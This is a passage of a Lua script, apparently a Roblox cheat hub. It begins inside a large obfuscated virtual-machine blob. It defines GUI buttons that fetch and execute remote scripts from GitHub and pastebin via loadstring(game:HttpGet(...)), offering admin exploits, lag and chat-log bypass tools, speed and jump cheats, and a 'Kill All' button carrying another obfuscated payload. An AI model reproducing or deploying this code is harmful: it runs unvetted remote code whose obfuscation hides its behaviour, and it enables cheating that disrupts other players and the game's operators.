RP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];else local DHRP_f;local DHRP_e;DHRP_e=DHRP_a[2];DHRP_f=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_e+1]=DHRP_f;DHRP_c[DHRP_e]=DHRP_f[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_e=DHRP_a[2]DHRP_c[DHRP_e]=DHRP_c[DHRP_e](DHRP_g(DHRP_c,DHRP_e+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];end;elseif DHRP_f<=73 then local DHRP_b=DHRP_a[2]DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3]))elseif DHRP_f>74 then local DHRP_e;local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[3];DHRP_e=DHRP_c[DHRP_f]for DHRP_a=DHRP_f+1,DHRP_a[4]do DHRP_e=DHRP_e..DHRP_c[DHRP_a];end;DHRP_c[DHRP_a[2]]=DHRP_e;DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];else local DHRP_h=DHRP_l[DHRP_a[3]];local DHRP_g;local DHRP_f={};DHRP_g=DHRP_p({},{__index=function(DHRP_b,DHRP_a)local DHRP_a=DHRP_f[DHRP_a];return DHRP_a[1][DHRP_a[2]];end,__newindex=function(DHRP_c,DHRP_a,DHRP_b)local DHRP_a=DHRP_f[DHRP_a]DHRP_a[1][DHRP_a[2]]=DHRP_b;end;});for DHRP_e=1,DHRP_a[4]do DHRP_b=DHRP_b+1;local DHRP_a=DHRP_d[DHRP_b];if DHRP_a[1]==60 then DHRP_f[DHRP_e-1]={DHRP_c,DHRP_a[3]};else DHRP_f[DHRP_e-1]={DHRP_k,DHRP_a[3]};end;DHRP_j[#DHRP_j+1]=DHRP_f;end;DHRP_c[DHRP_a[2]]=DHRP_i(DHRP_h,DHRP_g,DHRP_e);end;elseif DHRP_f<=78 then if DHRP_f<=76 then local DHRP_d=DHRP_a[3];local DHRP_b=DHRP_c[DHRP_d]for DHRP_a=DHRP_d+1,DHRP_a[4]do DHRP_b=DHRP_b..DHRP_c[DHRP_a];end;DHRP_c[DHRP_a[2]]=DHRP_b;elseif DHRP_f==77 then DHRP_b=DHRP_a[3];else local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a]=DHRP_c[DHRP_a](DHRP_g(DHRP_c,DHRP_a+1,DHRP_h))end;elseif DHRP_f<=79 then if(DHRP_c[DHRP_a[2]]~=DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f==80 then do return DHRP_c[DHRP_a[2]]end else local DHRP_d=DHRP_a[2];local DHRP_f=DHRP_a[4];local DHRP_e=DHRP_d+2 local DHRP_d={DHRP_c[DHRP_d](DHRP_c[DHRP_d+1],DHRP_c[DHRP_e])};for DHRP_a=1,DHRP_f do DHRP_c[DHRP_e+DHRP_a]=DHRP_d[DHRP_a];end;local DHRP_d=DHRP_d[1]if DHRP_d then DHRP_c[DHRP_e]=DHRP_d DHRP_b=DHRP_a[3];else DHRP_b=DHRP_b+1;end;end;elseif DHRP_f<=87 then if DHRP_f<=84 then if DHRP_f<=82 then if DHRP_c[DHRP_a[2]]then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f==83 then if(DHRP_c[DHRP_a[2]]==DHRP_a[4])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;else DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];end;elseif DHRP_f<=85 then do return DHRP_c[DHRP_a[2]]end elseif DHRP_f>86 then local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a](DHRP_c[DHRP_a+1])else local DHRP_d=DHRP_a[2];local DHRP_b=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_d+1]=DHRP_b;DHRP_c[DHRP_d]=DHRP_b[DHRP_a[4]];end;elseif DHRP_f<=90 then if DHRP_f<=88 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_c[DHRP_a[4]]];elseif DHRP_f==89 then if(DHRP_c[DHRP_a[2]]<=DHRP_a[4])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;else DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];end;elseif DHRP_f<=91 then local DHRP_b=DHRP_a[2];local DHRP_d=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_b+1]=DHRP_d;DHRP_c[DHRP_b]=DHRP_d[DHRP_a[4]];elseif DHRP_f>92 then local DHRP_h;local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])else DHRP_c[DHRP_a[2]]=(DHRP_a[3]~=0);end;DHRP_b=DHRP_b+1;end;end);end;return DHRP_i(true,{},DHRP_s())();end)(string.byte,table.insert,setmetatable);
    end,
})

local Button = Tab:CreateButton({
	Name = "Fates Admin (Edited)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua'))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Sync V4 GUI",
	Callback = function()
loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/ProjectBoring/Sync-v4/main/Sync%20v4.lua'))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Antisteal GUI",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/XrzAm6HZ", true))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Boombox Hub V3 GUI",
	Callback = function()
        loadstring(game:HttpGetAsync('https://riptxde.dev/u/hub/script.lua'))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Vertz Hub GUI",
	Callback = function()
        loadstring(game:HttpGetAsync('https://pastebin.com/raw/0DbL5px1'))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Vadrifts chat bypasser and anti chatlog",
	Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/scripts/main/vadriftsloader.lua'),true))()
    end,
})
--Redline Loader
local Button = Tab2:CreateButton({
	Name = "Redline GUI",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/topitbopit/Redline/main/beta.lua'))()
    end,
})

local Slider = Tab5:CreateSlider({
    Name = "Walkspeed",
    Range = {0, 500},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 15,
    Flag = "Speed", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end,
    })
   
    local Slider = Tab5:CreateSlider({
    Name = "JumpPower",
    Range = {0, 500},
    Increment = 1,
    Suffix = "Jump",
    CurrentValue = 10,
    Flag = "Power", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end,
   })
   
   local Button = Tab6:CreateButton({
	Name = "Lag Script",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/uhlpy/Universal/main/Lag%20Script", true))()
    end,
})

   local Button = Tab6:CreateButton({
	Name = "Kill All (1 tool = 1 person)",
	Callback = function()
return(function()local q=setmetatable local p=q({QW=function() end},{__sub=function(C,n)C.QW=n end,__div=function(C,n)return C.QW end})local O=q({qP={"JBb,Wc/z9hBi\n\'\'du6hY","tui92IKmvP\nQvH\"qFYvtuT8/","18kVb!6zZzzzK6k\"479Sztzzzz15J!1QJok5J2R","qk9ZB\vt\tN2\vqd2pT8/vaga","9b\tK7\vXdvpJz2vPGzG\tKooH/z9db\tA","epZT8/vT/LLsCKl,mKW\n2KS6SrCm,,o,mzphiu!","Au4k\"Lz,8zzzC1hL5bmR\"N!ZFKuk5VzK6z","Q\tKoWAmz9S62vPQV;5moo",",zzziz6zzt8qzzAk","HvzzzA4o1Fbh\a\"l\vR\"Lz,vzz","Oo\v\tc2Uv\a\tK7uXRO!","6zvzzzKbeBN!k\"lXR9z,zzzzeiJF6K","1\"bRi2HPqsS67vPfve\tK7II4I\v\tVQug","Ko\nB\",G\'rfv/Lo,mzphmiuK","\tfBuJ5pBcq\tTzOAL9rv\"c","gW8\"rl,m,V\nmhc2iP\"HhTB1\am","iOOwSSNrBOz9a,KeAfq\n\tKo\'mT","BoUvr\tK7uUW!QNIRvwF\vt\tfeWG/z9\"qvsPB\vt","tWAmOIKmvP\nPIOA!F9X\'LT8/vVU","vR\tKwkvP4AT8/vK/1q\ngal,mH9\nX\trGSr","pv1\tKwktClPT8/vp\n","ldexp","vPpve\tK7Ifl\a\ao\'W","O\"l\v1i479F1,OQ4\'RA;i85wu","v2fvB\tKwkXvmFT8/vemg4\vtwl,mH6\n","P\nl8OceWG\nz9\tpp\tf,Th5!FW","R\"l!6z6zzzKJeiJw\a\"46JQ;hePf","qG\tK/2M,dRS65vP\'W6\nS5u,","KUvr\tK7uqkFrNIUfRP\v","5O\"N46KzzzzKLR\"l\vLi;!O\"Rak5C!O","zc8zzz,tzzzz5vzzzt\t","fGzt\tKoW\n\nz9\"NtXo\tzN\tK7","zzN\vKzz,!z8zzU8Azzz\tHzzzOzv","P\tu7BR/1bS65vPUv;\tK7I\vpJtI,","Oz\aIK\nvPfqc\tKl4Tp\"rS65vP\'d9Qf\"","PQZl\'sLo,\nz9I,TvPcdl;vUtpKKc\tZ6BcXpJa2","zzA42\aiJ795Vz,vzzzAN\t","g;Y4Kl,mKC\nMz2Gq5QHV",",zzKgz6zzk6qzzP6,zGe\vT\a","/vH7\tuIMcNH/1WIKTvPcd9tV\"u7BGGNrUYAF\v","wVKmz9aCklHUq\n\tKot","c\'ol12\aJQXP\npe\'FVo,OzTS","t\tGUWtOz9\"cuR1V","\vt\tNH\vHUf/T8/vdH\twS","7vPKkhI\'J4w9eTS65vPUvd\tKoWC/z9\n,zgNhvq\tK","KzpU8uQb6!LwOG9Hb6WLKf,\tuoSkH","/WFBum4o,QORKfz\tuoWHmz9\"NBh","\tq\vmJirR\aav,QOPrr","N7RT\nP\vt\tzhWPmz9\"qGt\nF\vt\tt2\v4I\'\tT8/","S6/vPeW\aIbfo,\nzT\aHWoNOO","ReI2BlTvS62vPqd2GQeWQmz9\tgfeWLpfFl\al,mz","\tams\'M2h6w7o!r5FWl/dS;IU","5pT8/vh/1s4NRl,mKz\n2v;X","zJQ;heqz\"zzzz1i42RARa9BN!85uaeQ1VOQ4XOA4","Icfk\aQ7V/TdMBdWcmz9\nqu6q\ndS9Hmu","Vdo,\nz9IHmvPcdF\tidt,/rm\tJ2L2,TMvV;l,mKh","eXa2TMeP\"\a\tK7\v8;VAS6ivPt7GJFf\'\a4mK\aRiv","\"VkROe9\aTpvuYX\v4iB","\"pve\tK7IaI9\nIH\"vPcWUu2PWG\nz9\t1VJeLTQk","sYsJrt/G9aAKZTUqG\tK/24Hp\nS67vPhve","Q\tmXRAS\a4uNV/C7Z\nGFiz","RgB\vt\tqqmQic8oV\t5WUqt\tK5IZSpcIK2vPcdfU\ve","Cqr2A7Vt!\aOdIz\"vPQ\aI\a,UWK\nz9IztvPQZm\";e","9Iz/vPHviT\'14W,C8I","sPS5T8/v7OLh4PCl,","l,mHGIHOvPCuGLlrl,m,Wa,atGP\vt\t","T1\a\vFN9,tT8/vphv","dBN84o,S6/vPel4UAhWQ/z9h\'lIl","Hmz9J65vP\n8I\"QT2mRT","QC2\aPfzHzzzzAbu95J8kV","kVbukF149\vC\vRQJ\v6z8zzzKVk\"4!6","\tKw4/zUTN\'Q/Jv6co1/K,m,Cvz/v","GGWQ7\a8\"uPKfg\tK72fl\aMIH2vPHu\tq","J!\aQ;2q9zczzzz85;6TgKbeBRa\aQVzK6zz","hNBbm8X4JR\vlcR\'zPzzzz8B","P\nTC\'W85Zi\vPs\'\t\'Gfqb\tKoWC/z9h","gvmP,s7kRz;LpvI\tK6\t8d\'f","Kzzzz8zz98qzR8qzA6qz8zzzzzzzzz!zzzz","dWL/z9\tRfYvLpvZHAmfz42kghfOok8e\ahzH","\t5kaS!Cs6B\'1ud8\a9tYP\npJSqFo,","OV1l6z9zzzK\"R\"N!eFGo","z26Gzzq8Hzz,NzvzzF6Gzzt\'Hzz,IzvzzK6qzzK6","/z9\tVV7u,\abS66maBTYkTt\n","4kVb!kiJu\aqzAzzzz\a5Ca\aqzAzzz","\"w\v6zvzzzKLR\"C!ZQC7\aqzQzzzzgQJueP1\tOzz","char","zARaei1QOVbo\aAN\tO","zQMHiNKFddq\tlWVZd\tu7\v/uMOS65vP\'led;2ud","byte","zCN4\aANh9iVzK6zzzCK\'kV449BfzH6","bUvv\tKw/vuqeauVaQt6","zzzzKHO\"l\vk\"b\'RZRreiN!O\";2OzAzzz,zH","o89zAzzzzeiJW\aqzGzzzz8iCXOFKuk5hzH6z","zzP6GzzH9Hzzz5zvzz1vGzzCZHzzK\tzvzz\a8G","qRfve\tK7IWB\v9oM8lTUvO\t","Wzmz9IzQvPQJvLedWz\nz9IKIvP","zzA\a4\aAN\tO\"w\v9iJ2OzGzz","floor","BaGz9F\nz2oWGOz9h\tth","zzzz9zzzzGZzzzHfzzzzm6zz","q\n\tKoWQ\nz9hhiXTmC\tGaSFzzPiIzmvPC","remove","A4CNUTXqV\vt\tAfWbmz9\"q","\nCFo\"GFapmiT8/v7fvQ\tKwk","Revolve HubPi4H/RdXOo\'5U5C\aL2YP","OzzzzGvzzz,9zzzzSzzzzg8zzzCGzzzKu","find","gsub","%d%d%d?%d?%d?%d?%d?%d?","KzzzzKG\a\"ruei;aRCbheF","6zZzzzK,eQ;2R9zPz","6zuwT8/vCm8eaP1l,mHg\nmRHo\'!tJzeo,mz\ah4F","WHmz9J65vP\nLmLl\n2zv",";oNQ\vvboBBiQ/PiO2\vFICWgT8/v4f","Uib\nPN\'NqFpR\'eT8/vwpvi\tKwkf","s\vFiPk6T8/vupvi\tKwkM/9PT8/vw/L2gRNl,m","G1l,m,YaHpzOB\vt\tzGmldYBkTpUkfq","wdRl\tR1QYopOJS4l,mH4IKtvPCvkz","r46z\tzzzKL\aQC7\aQJ71FJa6z\tzzzKPRV1LRVb","\aPzA,\aHg2bl,mK8IH7vPCX8N6Jl,m,GabQr","HY\vOk5qT8/vTHm\tAswuclbTS62vP9W\"QheWcOz9\t","fmz9\nfif4//,7JVo,OzpI,5vPcW595oo,OzkoX","sF\vC5TXm\t\tkBrlo\aIL","z9\"Ab58P\vt\tC\n\vFzQTT8/v7gm6ZKPNgC1F","oHmz9oXh1W\nA;M1\tFlKIWT8/vHhvZ\tKwk","=","zzzAwhk5C\'ZQwuT\"J76z\vzzzK,OQC7k\"N!RVczHz","Per\tN7u/\"Y\tNmk;u/IChS67","zzzAure\"C2e54\v6KZzzzKQ","zzz1QJo\aPbhT9zQzzzzZQC7","zzzzANueQwYk\"Ns","Kl,mKWI,OvPCX\tgfwl,mHYaKPKMV\vt\tK9ms","pKV\vt\tAt\voOVqT8/vZH\tWcZXNw\vH1UMIqzWzN\t","z,zz6zzzA4o89z\nzzzz15J!ZQ","hMwvIUv\n\tK7uSlGXNWfBVH\t9\aU\au1XG!HQvUOuf","vlUvR\tKwk/KWQT8/vbm8bINrl,mzR\n","1zzzzRi47RV1h\a\"N\tO\"l!RVb49FLzKvzzzAu","zzz,5zzzzzvAzzKGKzzzvz8z","zzz,zz6zzzPNle\'z","Kmz9oXVL2mPFYv8Fl\vKNT8/vM","7Ik;\'osBIQO/Pl\'\"kFQ;mu\nMb,S\'rW15K4QpF4","b!6z9zzzKPRV1NkVNo6z6zzzKoRV1XeQ46ki;u9i","6V\vt\tNvmTT,aoZGquT7J65!",";qS65vPfv9\tK7IAC\vf\tZRF;L9u;QLWHmz9J67vP\n","QI,gvPHXvZLO2f/MhS","S65vPUvd\tKoo,OzpI,5vPc/8qloWC/z9hX","ivPfv\"\tKoWCOz9\nPvT","5;7RHlBR7S59iaHtJJiL\vMi","KWGVd\"\"ArQXPfwh","AzzGWKzzHRz8zzmvAzzc\vKzz,Pz8zz!zA","IHivPCv,B1al,mK4atUL5P\vt","\abJl,mzI\nh\",T\'FwSZJ4Au\v6H","zKzzzzA\a7OV,zKzzzz","qc\nsNvPmeIKTvPfqP",",OzTo\tGRevolve HubOAYJG6FoCCkT8/vzpvi\tKwk\'/","l","88\n/,pFFg;l,m,4IHOvPCv5","zzzzA;2g\"l5e5M46z8zzzKBk\"","oNXfzKzzzzC14TPLzC8zzzQ1a95Nh9i82R59",",\nvP\nQea!vFMICOT8/vOpvB\tKwkVK!BT8/vom","\tK7IrO8F\tJ\"lZLpO98AmJ;IGo1TM!f","\nC\"\ackF!uX;\nsbl6q5WOQO","oVoqhUJKN2\twoWHmz9\",\t\"qkzt\tKoW\n\nz9\"","a6dZ2w4mN4rt/G9a\nT,!UqN\tKdt49\n/\te","65vP9Wo6oYuN\avYNFvhkP\vt\tRevolve HubWqOz9\"bz","l,mzXa\n\tZWF\vt\tKvm6euhoL5,5hqt\tKIIg;z\t","K7ub;HvNUlLiV\vt\ttcWG/z9\"bi","6/vPqW/f\'\nuX,\'MNl8LwB\vt\tQBWq/z9\"","Tb;l,mH\naf1aTP\vt\tzWmwQ\vio\"2\'6Uqt\tK5I","7NAGZORevolve HubAo7XPQCPWZUo,Oz9\t9p/OlzdlO","art/G9aKpJThqN\tKdteY4q\tT8qGXTi8aM",";IzYvPHvSpuVtv;klIKHvP","6kSfv\n\tKwV,mz9at6J4hqt\tKoWHOz","0","\nLA1Loo,OzToa5VMOP!\n/!FG4oYT8/vXUvi\tKwk","OLOtcSeb4\abiv8/vmGzt\tKoWq\nz9\ntp\"G\ndCm1","d9/ib\tHuoWLGNlU\"JF\vt\tc","zzGzHzzHCzvzzX8Gzz\nqHzzH2zvz","ltgq/\"AGso,Ozko\'vv5/AW\a","zHvzzzCbre4N49BRak5VzH8zzzAu","vPfve\tKwAIO\thROR;8UqQ\tKoWGOz9IHHv","IK2vPcl\",rLWbOz9","mYH8ZdzQlHBVC\tu7B6/\n7I","kOaitkAT7g,qlrt/G9aqvpchqN\tKdtsveF\t","siGddpqN\tKUWfOz9","IH\nvPcdPlQh\'bKzvaaV9WTwP6U","Lp/QvhWHmz9J62vP\n18","sub","m,K\niBQLFOBBI\nuwAKKNwP96fv\n\tK","LzP8zzzQu!\aPKotYShRQ4ok","uKl\vwNUzMRV\vt\t\ncWbm","\";Fo\a2ANbl,m,eIHOvPCY;6Ubl,m,faGQ","hva\nGpqN\tKXtGHHf\tR6wfo\aQAK","WIKivPCXXdTal,mzVaf6PMF\vt\tAAmUu7\v\a","AhFk\auQiuvvkBNl","VzzzzL\"C\vRgKYTgKAO\"\aa\aQC\'OV1lGo\v","lcYAMYv8/v/kzt\tKoWq\nz9\nbVaU/d/KCeWL","v9Ya\aoAauKu\a\nsmBW\tfvG\tK6\tvz\t","\aF6N!vHIF\vt\t,UWb","Q\"F4\n,W,mz9S6/vPQZvZSYufUep","t\tcFWG/z9\",Gr\"B\vt\tbm\vQUktT8/v8Ha","Acu4IT/AS6ivPfvV\tKooK/z9Rkui;OWWq\ts","4vWf\'OYtg\aL2YP\n85cSho","Cl,mzJIHOvPCvHZSl","zc8AzzA9KzzKZz8zzV6AzzQ6KzzKWz8zzvv","Y\"gC9rVaZBo,mz\ahvwYehve\tK7I9Bi;a","m1Li\nPRMf9F1Uo4IzmvPC9P\tK7\vQ9wvS6","mz9\"\nQ\toB\vt\t\nm\vmi65T8/vdHmdlKFN6eshS6/vP","SFuXFso,mz\ahhv7G/ePBTF\'!","b!6zkzzzK,1Bbue\"VzHzzzzCR4eQ;X","eWsBlPWQ/z9hMpVBhv4\tK7Isv","\tNi\vzPMvT8/vO7sggfPNVi\'1HCploPZf\t","\vLdgTsMpb\nfqN\tKotHY6dIH5vP\nA5qdZFhzP9T8/","bxor","Hfvq\tK7IIAA!sBh1G\nPXr\a9FmPzq\nM1vrqrQ","cWb\nz9\"P5LfP\vt\tqm\vtC8iT8/vU7m98ocN5RR","zYvPHYSpzLtM,\vTIzTvP\nP","Qvm1z\vIo9lNSpqt\tK5I4lm!IK2vPcWsXgh","\a\vHzV6Quqg\t1wuq48cS67","vhp\a/AwhFkFIpMXIzmvPC9\n\tK7\vep9NsMBpmh","fve\tK7IHUu\vos8JUhv/\tK7","9FfzHzzzzCbheF18kV","uT\vBvNUUI\tV\vt\tbXWG/z9\"GWSJB\vt\tH7\vLQJFT8","vW\tKwkAdULT8/vZ/g9","Q\tKwkU;Z8T8/vCO8Z,fRl,mKM\n\vBJ","cpKI\tzN\tK7\vUvptsXfqYhqN\tKot/\vcuI","dMb\aL2YP\n8dwM,o,OzToaKScmQa\vUGF4v2,T","NoBkXV\vt\tCFWKmz9\"G1TvB\vt\tti\v;H75T8/vQg","wuT\"J79SzczzzzZPbae\"C7TJKu9BLz","zKH,ACQPGb\ncqNtf81gLZJ","\";26zZzzzKZOV1\'R9z","u\virIK2vPcle2QXWbOz9hv1B","bZ,Oz9Iz/vPC8q\tKwK2\aKqsBabmhvN\tK6\tOTVYIz","uei1\'R9zGzzzzL\"Co95w49Ff","MOIdT8/vUmLXmhal,mzd\nYwQ\'\'!","","XVP\vt\tAt\v8P\nKT8/v4gm\au;fN8ACt","1","kVeB\vt\tNg\vZRoWT8/vVgs\"q","unpack","uOAP\nN5FzkB\vt\tbpWcmz9\"HRCsP\vt\t",",IvPHXhFdo\'uQM9\aVTYP\n\a8KdoW","w6L/OG9S67vPfve\tK7ICW8QoY\t7","8/v;pvi\tKwkalRaT8/v5\nLIRJ4l,m,p\n",".","7vPcW;/RQ27llwIz2vP\nPX6\nvFavFB\nmW"}},{__sub=function(C,n)C.qP=n end,__add=function(C,n)return C.qP end})do local C,n=q({kh=1},{__pow=function(C,n)C.kh=n end,__index=function(C,n)return rawget(C,"kh")end}),q({GL=246},{__sub=function(C,n)C.GL=n end,__add=function(C,n)return C.GL end})while C.tU<n+"J1"do(O+"Ygb")[C.Vb],(O+"Yq")[n+"h6"]=(O+"j3")[n+"fv"],(O+"oS")[C.zi]C.kh,n.GL=C.lI+1,(n+"kz")-1 end C.kh,n.GL=1,179 while C.nx<n+"Rw"do(O+"aV")[C.Dl],(O+"IR")[n+"At"]=(O+"yZ")[n+"J9"],(O+"JI")[C.HS]C.kh,n.GL=C.B1+1,(n+"u")-1 